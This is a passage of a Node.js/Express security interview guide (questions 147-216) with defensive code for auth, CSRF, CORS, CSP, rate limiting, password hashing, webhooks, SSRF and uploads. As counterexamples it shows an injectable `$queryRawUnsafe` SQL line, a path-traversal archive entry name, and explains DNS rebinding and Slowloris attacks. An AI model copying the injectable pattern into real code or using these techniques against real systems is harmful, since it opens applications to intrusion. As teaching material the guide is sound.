`X-Forwarded-For` contains the client IP as seen by proxies. Each proxy appends the IP it received the request from.

Clients can send their own fake value, so you can only trust the entries added by your own proxies. That's what Express's `trust proxy` setting is for. Never use the leftmost value blindly for rate limiting or IP allowlists.

## 147: What is a security code review?

A security code review is reading code with a focus on security: where input enters, how it's validated, where it's used (queries, shell, file paths, HTML), how auth and permissions are checked, how secrets are handled and what new dependencies are added.

It works best as part of normal pull request reviews, with a checklist, and combined with automated tools like SAST scanners and dependency checks.

## 148: What is SAST and DAST?

SAST (Static Application Security Testing) scans source code without running it, looking for patterns like SQL concatenation or `eval`. Examples are Semgrep, CodeQL, SonarQube and `eslint-plugin-security`.

DAST (Dynamic Application Security Testing) attacks a running app from the outside, like a black-box tester. Examples are OWASP ZAP and Burp Suite.

They find different kinds of issues, so teams often use both.

## 149: What is secret scanning?

Secret scanning looks for API keys, tokens and passwords in code, commits and CI logs. GitHub secret scanning and push protection can block a push that contains a known key format. Tools like Gitleaks and TruffleHog can run locally, in pre-commit hooks and in CI.

If a secret is found, rotate it first, then clean it up.

## 150: What is the first thing to do when a secret leaks?

Revoke or rotate it immediately. Assume it was already used, because bots find public secrets within minutes.

Then: check logs for use of the secret, find out how it leaked, remove it from the code and history if needed, and fix the process (secret scanning, pre-commit hooks, a secrets manager). Deleting the commit alone doesn't make the secret safe again.

# Moderate Questions (151-300)

## 151: How would you set up a secure Express app from scratch?

A reasonable baseline:

```js
import express from "express";
import helmet from "helmet";
import cors from "cors";
import { rateLimit } from "express-rate-limit";

const app = express();

app.disable("x-powered-by");
app.set("trust proxy", 1);
app.use(helmet());
app.use(cors({ origin: ["https://app.example.com"], credentials: true }));
app.use(express.json({ limit: "100kb" }));
app.use(
  rateLimit({
    windowMs: 60_000,
    limit: 300,
    standardHeaders: "draft-7",
    legacyHeaders: false,
  }),
);

// routes with validation, auth and authorization...

app.use((req, res) => res.status(404).json({ error: "Not found" }));
app.use((err, req, res, next) => {
  req.log?.error({ err });
  res
    .status(err.status ?? 500)
    .json({ error: err.expose ? err.message : "Internal error" });
});
```

Then add session or token auth, schema validation per route, HTTPS at the proxy, and run as a non-root user with production dependencies only.

## 152: What changed in Express 5 that matters for security?

- Errors thrown in async handlers or rejected promises go to the error middleware automatically. In Express 4 they could crash the process or leave the request hanging.
- It uses a newer `path-to-regexp` that removes regex features in route paths that could cause ReDoS.
- `req.query` is now a getter and can't be reassigned, and the default query parser is `simple` instead of `extended`, so `?a[b]=1` no longer becomes a nested object unless you opt in. This makes NoSQL operator injection through the query string harder.
- `req.body` is `undefined` when no body parser ran.
- Old deprecated APIs were removed, and Node 18+ is required.

## 153: How do you write an authentication middleware for JWT access tokens?

```js
import { jwtVerify } from "jose";

const key = new TextEncoder().encode(process.env.JWT_SECRET);

export async function requireAuth(req, res, next) {
  const header = req.get("authorization") ?? "";
  const [scheme, token] = header.split(" ");
  if (scheme !== "Bearer" || !token) return res.status(401).end();

  try {
    const { payload } = await jwtVerify(token, key, {
      algorithms: ["HS256"],
      issuer: "https://api.example.com",
      audience: "web",
    });
    req.user = { id: payload.sub, roles: payload.roles ?? [] };
    next();
  } catch {
    res.status(401).end();
  }
}
```

Fix the algorithm list, check `iss` and `aud`, and return the same 401 for every failure.

## 154: How do you implement refresh tokens securely?

- Make the refresh token a long random string, not a JWT, and store only its hash in the database with the user ID, expiry, device info and a family ID.
- Send it in an `HttpOnly`, `Secure`, `SameSite=Strict` cookie with `Path=/auth/refresh`, so it's only sent to that endpoint.
- On each refresh, rotate it: mark the old one used, issue a new one in the same family.
- If a used token comes back, revoke the whole family.
- Revoke all tokens on password change and logout-all.

## 155: How do you revoke JWTs before they expire?

JWTs are valid until `exp`, so you need extra state:

- Keep access tokens short (5-15 minutes) and revoke refresh tokens in the database.
- Keep a deny list of revoked token IDs (`jti`) in Redis with a TTL equal to the remaining lifetime.
- Store a `tokenVersion` on the user, put it in the token, and reject tokens with an older version. Bump it on password change or "log out everywhere".

Each option adds a lookup, which removes part of the "stateless" benefit. That's a normal trade-off.

## 156: When would you choose sessions over JWTs?

Sessions are often the better choice for a classic web app with one back end: easy revocation, small cookies, no token storage problems in the browser, and lots of mature libraries.

JWTs make more sense when many independent services or third parties need to verify identity without calling a central store, or for short-lived tokens between services. Many systems use both: a session with the browser, and short JWTs between internal services.

## 157: How do you store sessions in Redis?

```js
import session from "express-session";
import { RedisStore } from "connect-redis";
import { createClient } from "redis";

const redisClient = createClient({ url: process.env.REDIS_URL });
await redisClient.connect();

app.use(
  session({
    store: new RedisStore({ client: redisClient, prefix: "sess:" }),
    secret: [process.env.SESSION_SECRET_NEW, process.env.SESSION_SECRET_OLD],
    name: "__Host-sid",
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      secure: true,
      sameSite: "lax",
      path: "/",
      maxAge: 8 * 3600_000,
    },
  }),
);
```

Passing an array of secrets lets you rotate: the first signs new cookies and all are accepted for verifying. Protect Redis with a password or ACL and TLS, and don't expose it publicly.

## 158: What are the __Host- and __Secure- cookie prefixes?

They are cookie name prefixes the browser enforces:

- `__Secure-name`: must have the `Secure` flag and be set over HTTPS.
- `__Host-name`: must be `Secure`, must have `Path=/`, and must not have a `Domain` attribute, so it's locked to the exact host.

`__Host-` stops a compromised or malicious subdomain from setting or overwriting your session cookie.

## 159: How do you protect a single page app that uses cookie sessions against CSRF?

Combine a few things:

1. `SameSite=Lax` or `Strict` on the session cookie.
2. Reject state-changing requests whose `Origin` header isn't your front-end origin.
3. Require a custom header or a CSRF token on unsafe methods. A cross-site form can't set custom headers, and a cross-origin fetch with custom headers triggers a CORS preflight that your server rejects.

```js
const allowed = new Set(["https://app.example.com"]);

app.use((req, res, next) => {
  if (["GET", "HEAD", "OPTIONS"].includes(req.method)) return next();
  const origin = req.get("origin");
  if (!origin || !allowed.has(origin)) return res.status(403).end();
  next();
});
```

## 160: What is the double submit cookie pattern?

The server sets a random CSRF token in a cookie that JavaScript can read, and the client sends the same value in a header or form field. The server checks that they match. A cross-site attacker can make the browser send the cookie but can't read it to put it in the header.

The plain version is weak if an attacker can set cookies (for example from a subdomain), so use the signed version, where the token is an HMAC tied to the session. The `csrf-csrf` package implements this. The old `csurf` package is deprecated and shouldn't be used.

## 161: How do you use Fetch Metadata headers to block cross-site requests?

Modern browsers send `Sec-Fetch-Site`, `Sec-Fetch-Mode` and `Sec-Fetch-Dest` headers. You can reject cross-site requests that aren't simple navigations:

```js
app.use((req, res, next) => {
  const site = req.get("sec-fetch-site");
  if (!site) return next(); // old browser or non-browser client
  if (["same-origin", "same-site", "none"].includes(site)) return next();
  if (req.method === "GET" && req.get("sec-fetch-mode") === "navigate")
    return next();
  res.status(403).end();
});
```

This is a simple and strong defense against CSRF and some cross-site leaks. Keep other defenses for clients that don't send these headers.

## 162: What are common CORS misconfigurations?

- Reflecting any `Origin` back in `Access-Control-Allow-Origin` together with `Access-Control-Allow-Credentials: true`. Any site can then read user data.
- Weak origin checks like `origin.endsWith("example.com")`, which matches `evilexample.com`, or regexes without anchors.
- Allowing `null` as an origin. Sandboxed iframes and local files send `null`, so attackers can use it.
- Allowing all origins on internal APIs, thinking the network protects them.

Use an exact set of allowed origins.

## 163: How do you configure CORS with a dynamic list of origins?

```js
const allowedOrigins = new Set(process.env.CORS_ORIGINS.split(","));

app.use(
  cors({
    origin(origin, callback) {
      // allow requests without Origin (curl, server-to-server)
      if (!origin || allowedOrigins.has(origin)) return callback(null, true);
      callback(null, false);
    },
    credentials: true,
  }),
);
```

Compare full origins exactly. The `cors` package also sets `Vary: Origin` so caches don't serve one origin's headers to another.

## 164: How do you set up a nonce-based CSP with Helmet?

```js
import crypto from "node:crypto";
import helmet from "helmet";

app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString("base64");
  next();
});

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: [
          "'self'",
          (req, res) => `'nonce-${res.locals.cspNonce}'`,
          "'strict-dynamic'",
        ],
        objectSrc: ["'none'"],
        baseUri: ["'none'"],
        frameAncestors: ["'none'"],
      },
    },
  }),
);
```

Then put the nonce on your script tags in the template: `<script nonce="<%= cspNonce %>">`. The nonce must be new on every response.

## 165: How do you roll out a CSP without breaking the site?

Start with `Content-Security-Policy-Report-Only`. The browser reports violations but doesn't block anything. Collect reports with the `report-to` directive (and the `Reporting-Endpoints` header) or the older `report-uri`, fix the real violations, then switch to the enforcing header.

```js
app.use(
  helmet({
    contentSecurityPolicy: { reportOnly: true, directives: {/* ... */} },
  }),
);
```

Expect noise from browser extensions in the reports.

## 166: What headers does Helmet set by default, and which would you change?

Helmet 8 sets, among others: a basic `Content-Security-Policy`, `Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Resource-Policy: same-origin`, `Origin-Agent-Cluster`, `Referrer-Policy: no-referrer`, `Strict-Transport-Security` (one year, with subdomains), `X-Content-Type-Options: nosniff`, `X-DNS-Prefetch-Control: off`, `X-Download-Options`, `X-Frame-Options: SAMEORIGIN`, `X-Permitted-Cross-Domain-Policies: none`, and `X-XSS-Protection: 0`. It removes `X-Powered-By`.

You usually tune the CSP for your real assets, and you might relax `Cross-Origin-Resource-Policy` for assets served to other sites. For a pure JSON API, the CSP matters less, but it doesn't hurt.

## 167: Why does Helmet set X-XSS-Protection to 0?

The old browser XSS filter (`X-XSS-Protection: 1`) was removed from modern browsers, and when it existed it could itself be used for attacks, like leaking data by making the filter block parts of the page. The current advice is to turn it off explicitly and use a CSP instead.

## 168: How do you implement a distributed rate limiter?

With several Node instances, each in-memory limiter counts only its own traffic. Use a shared store like Redis.

```js
import { rateLimit } from "express-rate-limit";
import { RedisStore } from "rate-limit-redis";

const limiter = rateLimit({
  windowMs: 60_000,
  limit: 100,
  standardHeaders: "draft-7",
  legacyHeaders: false,
  store: new RedisStore({
    sendCommand: (...args) => redisClient.sendCommand(args),
  }),
});
```

For more control (sliding windows, multiple limits, blocking), `rate-limiter-flexible` is a common choice. Rate limiting at the proxy or API gateway is also an option.

## 169: How do you choose the key for rate limiting?

- By IP for anonymous endpoints. Make sure `trust proxy` is set correctly, and group IPv6 addresses by subnet, because one user often controls a whole range (`express-rate-limit` v8 does this by default with its `ipv6Subnet` option).
- By user ID or API key for logged-in endpoints.
- For login, use both: per IP and per target account, so one IP can't try many accounts and many IPs can't attack one account.
- For expensive endpoints (search, export, AI calls), use separate, lower limits.

## 170: How do you slow down brute force login attempts without locking users out?

Use progressive delays and layered limits:

- After a few failures per account and IP, add an increasing delay or require a CAPTCHA.
- Block an IP after many failures across many accounts (credential stuffing).
- Temporarily lock an account after many failures, and notify the user.
- Let users with a known device or a valid passkey log in even during throttling.

`rate-limiter-flexible` has examples for "consecutive fails by username and IP".

## 171: How do you check a password against breached password lists?

Use the Have I Been Pwned Pwned Passwords API with k-anonymity. You send only the first 5 characters of the SHA-1 hash, and it returns all suffixes that start with them, so the password never leaves your server.

```js
import { createHash } from "node:crypto";

async function isBreached(password) {
  const hash = createHash("sha1").update(password).digest("hex").toUpperCase();
  const prefix = hash.slice(0, 5);
  const suffix = hash.slice(5);
  const res = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`, {
    headers: { "Add-Padding": "true" },
  });
  const text = await res.text();
  return text
    .split("\n")
    .some((line) => line.startsWith(suffix) && !line.endsWith(":0"));
}
```

SHA-1 is fine here because it's only used as a lookup key, not for storing passwords.

## 172: What Argon2 parameters would you use?

OWASP's current minimum for `argon2id` is 19 MiB of memory, 2 iterations and 1 degree of parallelism, or other combinations with the same cost, like 46 MiB with 1 iteration.

```js
import argon2 from "argon2";

const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 19456, // KiB
  timeCost: 2,
  parallelism: 1,
});
```

Measure on your real servers. A hash should take roughly tens to a few hundred milliseconds. The parameters are stored in the hash string, so you can raise them later and rehash on next login.

## 173: How do you use the built-in crypto.scrypt for passwords?

```js
import { scrypt, randomBytes, timingSafeEqual } from "node:crypto";
import { promisify } from "node:util";

const scryptAsync = promisify(scrypt);

export async function hashPassword(password) {
  const salt = randomBytes(16);
  const key = await scryptAsync(password, salt, 64, {
    N: 2 ** 17,
    r: 8,
    p: 1,
    maxmem: 256 * 1024 * 1024,
  });
  return `scrypt$${salt.toString("base64")}$${key.toString("base64")}`;
}

export async function verifyPassword(password, stored) {
  const [, saltB64, keyB64] = stored.split("$");
  const expected = Buffer.from(keyB64, "base64");
  const key = await scryptAsync(
    password,
    Buffer.from(saltB64, "base64"),
    expected.length,
    { N: 2 ** 17, r: 8, p: 1, maxmem: 256 * 1024 * 1024 },
  );
  return timingSafeEqual(key, expected);
}
```

`N=2^17, r=8, p=1` is the OWASP minimum. `maxmem` must be raised because the default limit is 32 MiB. In real code, store the parameters with the hash too.

## 174: How do you upgrade old password hashes without forcing a reset?

On each successful login you have the plain password for a moment, so:

1. Verify against the old hash.
2. If it's an old algorithm or weak parameters, hash with the new settings and save it.

```js
if (await verifyOld(password, user.hash)) {
  if (needsRehash(user.hash)) {
    user.hash = await argon2.hash(password);
    await user.save();
  }
}
```

For very weak old hashes (unsalted MD5), you can wrap them right away, `argon2(md5(password))`, so the database is protected even for users who never log in again.

## 175: What is a pepper and should you use one?

A pepper is a secret key added to password hashing, stored outside the database (in a secrets manager or HSM). Usually you HMAC the password with the pepper before hashing, or encrypt the hash after.

If only the database leaks, the attacker can't crack hashes without the pepper. The cost is extra key management: if you lose the pepper, all passwords are lost, and rotation is harder. It's an optional extra on top of a proper password hash.

## 176: How do you implement email verification?

1. On signup, create the account as unverified.
2. Generate a random token, store its hash with an expiry, and email a link.
3. When the link is opened, hash the token, find it, check expiry, mark the email verified and delete the token.
4. Don't give unverified accounts access to features that depend on owning the email (invites, password reset to that address, domain-based access).

Use a one-time token, not a JWT, so it can't be reused and is easy to revoke.

## 177: How do you handle email change securely?

- Require recent authentication (password or MFA) to start the change.
- Send a confirmation link to the new address, and only switch after it's confirmed.
- Send a notice to the old address with a way to cancel.
- Invalidate other sessions after the change.

Otherwise an attacker with a stolen session changes the email, then resets the password, and the account is gone.

## 178: What is step-up authentication?

Step-up authentication asks the user to authenticate again, or with a stronger factor, before a sensitive action, even if they already have a session. Examples: changing password or email, adding a payment method, deleting the account, viewing API keys, large money transfers.

You can store `authTime` and the methods used in the session, and require a fresh login (for example in the last 5 minutes) for those routes.

## 179: How do you implement TOTP 2FA in Node.js?

Example with the `otplib` v12 API:

```js
import { authenticator } from "otplib";
import QRCode from "qrcode";

// Setup
const secret = authenticator.generateSecret();
const uri = authenticator.keyuri(user.email, "MyApp", secret);
const qr = await QRCode.toDataURL(uri);
// store secret encrypted as "pending" until the user confirms a code

// Verify
const ok = authenticator.verify({ token: req.body.code, secret });
```

Store the secret encrypted, confirm setup with one valid code, generate backup codes (stored hashed), rate limit verification, and remember the last used time step to block replays.

## 180: How do you add passkey login to a Node.js app?

Use a library like `@simplewebauthn/server`. The flow:

1. Registration: the server creates options with a random challenge (`generateRegistrationOptions`), the browser calls `navigator.credentials.create()`, the server checks the response with `verifyRegistrationResponse` and stores the credential ID, public key and counter.
2. Login: the server creates a challenge (`generateAuthenticationOptions`), the browser calls `navigator.credentials.get()`, the server checks it with `verifyAuthenticationResponse` against the stored public key.

Store challenges on the server (in the session) and use them once. Set the expected origin and RP ID exactly.

## 181: How do you implement "Sign in with Google" securely?

Use the Authorization Code flow with PKCE through a library like `openid-client` or Passport strategies.

- Generate `state` and a PKCE `code_verifier`, store them in the session, and check them in the callback.
- Exchange the code for tokens on the server.
- Verify the ID token: signature, `iss`, `aud` (your client ID), `exp`, and `nonce` if you sent one.
- Identify the user by `iss` + `sub`, not by email. If you link by email, only do it when `email_verified` is true and the provider is trusted for that domain.

## 182: What is PKCE and why is it used?

PKCE (Proof Key for Code Exchange) protects the OAuth authorization code. The client creates a random `code_verifier`, sends a hash of it (`code_challenge`) in the authorization request, and sends the original verifier when exchanging the code.

If someone steals the code (through a malicious app, logs or a redirect bug), they can't use it without the verifier. OAuth 2.1 and current best practice require PKCE for all clients, including server-side ones.

## 183: Why is the OAuth state parameter important?

`state` is a random value the client sends in the authorization request and checks in the callback. It ties the callback to the user's own login attempt.

Without it, an attacker can start a login with their own account and get the victim's browser to finish it (login CSRF), so the victim ends up logged into the attacker's account and may save private data there. PKCE also helps against this, but checking `state` is still standard.

## 184: How do you secure webhooks you receive?

Verify the signature that the sender adds, using the raw body and a constant-time comparison:

```js
import { createHmac, timingSafeEqual } from "node:crypto";

app.post(
  "/webhooks/payments",
  express.raw({ type: "application/json" }),
  (req, res) => {
    const signature = req.get("x-signature") ?? "";
    const expected = createHmac("sha256", process.env.WEBHOOK_SECRET)
      .update(req.body)
      .digest("hex");
    const a = Buffer.from(signature);
    const b = Buffer.from(expected);
    if (a.length !== b.length || !timingSafeEqual(a, b))
      return res.status(401).end();

    const event = JSON.parse(req.body.toString("utf8"));
    // process event idempotently
    res.sendStatus(200);
  },
);
```

Also check a timestamp to block replays, handle duplicate events, and use the provider's SDK when one exists (for example Stripe's `constructEvent`).

## 185: Why do you need the raw body to verify webhook signatures?

The signature is computed over the exact bytes the sender sent. If `express.json()` parses the body and you re-serialize it with `JSON.stringify`, spacing, key order or number formatting can change, and the signature won't match.

Use `express.raw()` on the webhook route, or the `verify` option of `express.json()` to keep a copy of the raw buffer.

## 186: How do you send webhooks securely to your customers?

- Sign each payload with an HMAC using a per-customer secret, and include a timestamp in the signed data.
- Send only to HTTPS URLs, and protect against SSRF, because the customer chooses the URL. Block private and internal IP ranges.
- Use short timeouts and limit retries, response size and redirects.
- Let customers rotate the secret, with both old and new valid for a while.

## 187: How do you prevent replay attacks on signed requests?

Include a timestamp and sometimes a nonce in the signed data, and reject requests that are too old or already seen.

```js
const ts = Number(req.get("x-timestamp"));
if (!Number.isFinite(ts) || Math.abs(Date.now() / 1000 - ts) > 300) {
  return res.status(401).end();
}
// signature = HMAC(secret, `${ts}.${rawBody}`)
// optionally store the nonce in Redis with a 5 minute TTL and reject repeats
```

## 188: How would you design an API key system?

- Generate keys with `crypto.randomBytes(32)` and a recognizable prefix like `sk_live_` (helps secret scanners and users).
- Show the key once. Store only a SHA-256 hash (a slow hash isn't needed because keys are long and random), plus a short visible prefix for identification.
- Attach scopes, an owner, a creation date, last used time and an optional expiry.
- Look up by hash on each request, and check scopes.
- Allow several active keys per account so users can rotate without downtime, and allow instant revocation.
- Rate limit per key and log usage.

## 189: How do you implement authorization checks so they aren't forgotten?

- Deny by default: routes require auth unless explicitly marked public.
- Put the checks in one place (middleware, policy functions or a library like CASL) instead of scattered `if` statements.
- Scope queries by owner or tenant in a data access layer, so a handler can't easily load someone else's data.
- Write tests that call each endpoint as the wrong user and expect `403` or `404`.

```js
const can = {
  "invoice:read": (user, invoice) => invoice.orgId === user.orgId,
  "invoice:delete": (user, invoice) =>
    invoice.orgId === user.orgId && user.role === "admin",
};
```

## 190: What is ABAC and when do you need it over RBAC?

ABAC (Attribute-Based Access Control) decides access based on attributes of the user, the resource, the action and the context, like "a user can edit a document if they're in the same department and the document isn't locked, during working hours".

RBAC is enough for "admins can do X". When rules depend on ownership, relationships or data values, you need attribute or relationship-based checks. Tools like CASL, Casbin, OpenFGA or Cerbos help keep these rules organized.

## 191: How do you avoid mass assignment in Mongoose or Prisma?

Pick fields explicitly or validate with a strict schema:

```js
const UpdateProfile = z.object({
  name: z.string().max(100),
  bio: z.string().max(500).optional(),
}); // unknown keys are stripped by default

const data = UpdateProfile.parse(req.body);
await prisma.user.update({ where: { id: req.user.id }, data });
```

In Mongoose, keep `strict` mode on (the default) so fields not in the schema are ignored, but remember that fields like `role` are in the schema, so they still need to be excluded.

## 192: How do you prevent NoSQL injection in Mongoose?

- Validate types with a schema, so `email` and `password` must be strings.
- Turn on `sanitizeFilter`, which wraps values that look like operators (objects with `$` keys) in `$eq`:

```js
mongoose.set("sanitizeFilter", true);
```

- Avoid `$where` and `$function`, which run JavaScript in the database.
- In Express 4, use `app.set("query parser", "simple")` so query strings don't turn into nested objects. Express 5 does this by default.

## 193: Is Prisma safe from SQL injection?

Normal Prisma Client queries (`findMany`, `create`, `update`) are parameterized, so yes for those. With raw queries:

```js
// Safe: tagged template, values are parameters
await prisma.$queryRaw`SELECT * FROM "User" WHERE email = ${email}`;

// Unsafe: string building
await prisma.$queryRawUnsafe(`SELECT * FROM "User" WHERE email = '${email}'`);
```

`$queryRawUnsafe` and `$executeRawUnsafe` are only safe if you pass values as separate parameters (`$1`, `$2`). Dynamic table or column names can't be parameters, so check them against an allowlist.

## 194: How do you safely build a dynamic ORDER BY or column name?

Identifiers (tables, columns, sort direction) can't be passed as query parameters. Map user input to a fixed set of allowed values:

```js
const sortColumns = { name: "name", created: "created_at", price: "price" };
const column = sortColumns[req.query.sort] ?? "created_at";
const direction = req.query.dir === "asc" ? "ASC" : "DESC";

await pool.query(
  `SELECT * FROM products ORDER BY ${column} ${direction} LIMIT $1`,
  [limit],
);
```

Never put the raw user value into the SQL text.

## 195: How do you prevent SSRF in a feature that fetches user-provided URLs?

- Allow only `https:` (maybe `http:`) and an allowlist of domains when possible.
- Resolve the hostname yourself and block private, loopback, link-local and metadata addresses (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`, `::1`, `fc00::/7`, `fe80::/10`, and IPv4-mapped IPv6).
- Connect to the IP you checked, so DNS can't change between check and connect.
- Don't follow redirects automatically, or check every hop again.
- Set timeouts and a max response size.
- Run the fetcher in a network segment that can't reach internal services.

## 196: What is DNS rebinding and how does it affect SSRF protection?

DNS rebinding is when a domain resolves to a safe public IP when you check it, and to an internal IP (like `127.0.0.1`) a moment later when you connect. If your code resolves once to validate and lets the HTTP client resolve again to connect, the check is bypassed.

The fix is to resolve once and connect to that exact IP, for example by passing a custom `lookup` function that validates the address to the HTTP agent, so the check happens at connect time.

## 197: How do you validate that an IP address is private in Node.js?

Use `net.BlockList`, which is built in:

```js
import net from "node:net";

const blocked = new net.BlockList();
blocked.addSubnet("10.0.0.0", 8);
blocked.addSubnet("172.16.0.0", 12);
blocked.addSubnet("192.168.0.0", 16);
blocked.addSubnet("127.0.0.0", 8);
blocked.addSubnet("169.254.0.0", 16);
blocked.addSubnet("0.0.0.0", 8);
blocked.addSubnet("100.64.0.0", 10);
blocked.addSubnet("::1", 128, "ipv6");
blocked.addSubnet("fc00::", 7, "ipv6");
blocked.addSubnet("fe80::", 10, "ipv6");

function isBlocked(ip) {
  return blocked.check(ip, net.isIPv6(ip) ? "ipv6" : "ipv4");
}
```

Also handle IPv4-mapped IPv6 like `::ffff:127.0.0.1`. Packages like `ipaddr.js` can help with that.

## 198: How do you check the real type of an uploaded file?

Read the first bytes (magic numbers) instead of trusting the extension or the `Content-Type` sent by the client:

```js
import { fileTypeFromBuffer } from "file-type";

const type = await fileTypeFromBuffer(req.file.buffer);
if (!type || !["image/png", "image/jpeg", "image/webp"].includes(type.mime)) {
  return res.status(400).json({ error: "Unsupported file type" });
}
```

For images, re-encoding with `sharp` is even better. It drops metadata (like GPS location) and anything hidden after the image data.

## 199: Why are SVG uploads dangerous?

SVG is XML and can contain `<script>` tags, event handlers like `onload`, and external references. If you serve an uploaded SVG from your domain and a user opens it directly, the script runs with your site's origin, which is stored XSS.

Options: don't accept SVG, convert it to PNG, sanitize it with DOMPurify, or serve user files from a separate domain with `Content-Disposition: attachment` and a strict CSP like `default-src 'none'`.

## 200: Where should uploaded files be stored?

Best: in object storage (S3, GCS, Azure Blob) in a private bucket, with random object keys, and served through short-lived signed URLs or a separate domain/CDN. That keeps uploads out of your app server's disk and away from your main origin.

If you must store them locally, keep them outside any folder served statically, use generated names, and set strict permissions.

## 201: How do you serve user-uploaded files safely?

- Serve them from a different domain (like `usercontent.example.net`) so any script in them can't touch your main site's cookies or origin.
- Set the right `Content-Type` from your own check, plus `X-Content-Type-Options: nosniff`.
- Use `Content-Disposition: attachment` for anything that isn't a known safe image type.
- Add a strict CSP for that domain, like `default-src 'none'; style-src 'unsafe-inline'; sandbox`.
- Check permissions before giving out each file or signed URL.

## 202: What is a zip slip vulnerability?

Zip slip happens when you extract an archive and an entry has a name like `../../app/server.js` or an absolute path. A naive extractor writes the file outside the target folder, which can overwrite code or config.

Check every entry's resolved path stays inside the destination before writing, and skip symlink entries unless you need them. Also limit the total extracted size and the number of entries, to avoid zip bombs.

## 203: How do you protect against zip bombs and decompression bombs?

A zip bomb is a small compressed file that expands to gigabytes. The same issue exists with gzip request bodies and image formats.

- Limit the uncompressed size while streaming, and stop when the limit is reached.
- Limit the number of files in an archive.
- For gzip request bodies, body parsers apply `limit` to the inflated size, so keep limits small.
- For images, `sharp` has a `limitInputPixels` option (on by default) to reject huge dimensions.

## 204: How do you validate environment variables at startup?

Parse `process.env` with a schema and crash early if something is missing or wrong:

```js
import { z } from "zod";

const Env = z.object({
  NODE_ENV: z.enum(["development", "test", "production"]),
  DATABASE_URL: z.url(),
  JWT_SECRET: z.string().min(32),
  CORS_ORIGINS: z.string(),
});

export const env = Env.parse(process.env);
```

This avoids running in production with an empty secret or a dev setting by mistake. Don't print the values in the error message.

## 205: What problems come with keeping secrets in environment variables?

- They're visible to any code in the process, including every dependency.
- Child processes inherit them by default.
- They can end up in crash reports, debug endpoints, `/proc/<pid>/environ`, `docker inspect` output and error trackers.
- Rotation usually needs a restart.

Mitigations: pass only needed vars to child processes, read sensitive secrets from a secrets manager or mounted files, keep dependencies under control, and filter env from error reports.

## 206: How do you stop child processes from inheriting all secrets?

Pass an explicit `env` object:

```js
import { spawn } from "node:child_process";

spawn("imagemagick-wrapper", [input, output], {
  env: { PATH: process.env.PATH, LANG: "C" },
  stdio: "inherit",
});
```

Without the `env` option, the child gets the whole `process.env`, including `DATABASE_URL` and API keys.

## 207: How do you load secrets from AWS Secrets Manager in Node.js?

```js
import {
  SecretsManagerClient,
  GetSecretValueCommand,
} from "@aws-sdk/client-secrets-manager";

const client = new SecretsManagerClient({});

export async function getSecret(id) {
  const res = await client.send(new GetSecretValueCommand({ SecretId: id }));
  return JSON.parse(res.SecretString);
}

const db = await getSecret("prod/orders/db");
```

The app authenticates with its IAM role, so no static key is needed. Cache the value in memory for a short time, and refresh it so rotation works without a restart.

## 208: What is envelope encryption?

You encrypt data with a data key (DEK), and encrypt the data key with a master key (KEK) that lives in a KMS or HSM and never leaves it. You store the encrypted data next to the encrypted DEK.

To decrypt, you ask the KMS to decrypt the DEK, then decrypt the data locally. This allows big data to be encrypted fast, limits KMS calls, and makes key rotation easier because you only re-encrypt DEKs, not all data. AWS KMS `GenerateDataKey` gives you both forms of the DEK in one call.

## 209: How do you encrypt specific database fields?

Encrypt in the application before saving, with AES-256-GCM and keys from a KMS (envelope encryption), and store a key version with each value so you can rotate.

Some tools help: MongoDB Client-Side Field Level Encryption and Queryable Encryption, and Prisma or Mongoose extensions. Remember that encrypted fields can't be searched normally. For exact-match lookups you can store an HMAC "blind index" next to the encrypted value.

## 210: How do you configure TLS options when running an HTTPS server in Node?

```js
import https from "node:https";
import fs from "node:fs";

const server = https.createServer(
  {
    key: fs.readFileSync("/etc/tls/tls.key"),
    cert: fs.readFileSync("/etc/tls/tls.crt"),
    minVersion: "TLSv1.2",
  },
  app,
);

server.listen(443);
```

Node's default cipher list and minimum version are already reasonable. Raise `minVersion` to `TLSv1.3` if all clients support it. Reload certificates without downtime with `server.setSecureContext()`.

## 211: Why is NODE_TLS_REJECT_UNAUTHORIZED=0 dangerous?

It turns off certificate verification for every TLS connection the process makes: database, HTTP calls, everything. Any attacker in the network path can then pretend to be any server and read or change the traffic. Node prints a warning when it's set, for a reason.

It's often added "temporarily" to fix a self-signed cert issue and then forgotten. Fix the real problem instead: add the internal CA with `NODE_EXTRA_CA_CERTS` or the `ca` option. Node 23.8+ also has `--use-system-ca` to trust the OS certificate store.

## 212: What is mutual TLS (mTLS)?

In normal TLS only the server shows a certificate. In mTLS the client also shows a certificate, and the server checks it. It's used for service-to-service authentication, often set up automatically by a service mesh like Istio or Linkerd.

```js
https.createServer(
  {
    key,
    cert,
    ca: fs.readFileSync("internal-ca.pem"),
    requestCert: true,
    rejectUnauthorized: true,
  },
  (req, res) => {
    const peer = req.socket.getPeerCertificate();
    res.end(`hello ${peer.subject.CN}`);
  },
);
```

## 213: How do you make outgoing HTTP calls safely?

- Always set timeouts. Node's `fetch` has no short default, so use `AbortSignal.timeout()`.
- Limit response size before reading it into memory.
- Use HTTPS and keep certificate checks on.
- Don't send secrets to URLs that come from users.
- Be careful with redirects: a redirect can send you to an internal address or to `http://`.

```js
const res = await fetch(url, {
  signal: AbortSignal.timeout(5000),
  redirect: "manual",
});
```

## 214: What HTTP server timeouts should you know in Node.js?

- `server.headersTimeout` (default 60s): how long to wait for the full request headers.
- `server.requestTimeout` (default 300s since Node 18): how long to wait for the whole request.
- `server.keepAliveTimeout` (default 5s): how long to keep an idle keep-alive connection.
- `server.timeout` (default 0, disabled): socket inactivity timeout.

Lower `requestTimeout` and `headersTimeout` to protect against slow clients (Slowloris-style attacks), keeping in mind slow uploads. Behind a load balancer, set `keepAliveTimeout` higher than the LB's idle timeout to avoid random 502s.

## 215: What is a Slowloris attack?

Slowloris opens many connections and sends request headers very slowly, a few bytes at a time, to keep connections open and use up server resources. It needs very little bandwidth.

Node's `headersTimeout` and `requestTimeout` help, and a reverse proxy like Nginx is usually better at dealing with slow clients. Limiting connections per IP at the proxy also helps.

## 216: What is the max header size in Node and why does it exist?

Node limits the total size of HTTP request headers to 16 KB by default. Larger requests get `431 Request Header Fields Too Large`. It prevents memory abuse with huge headers.

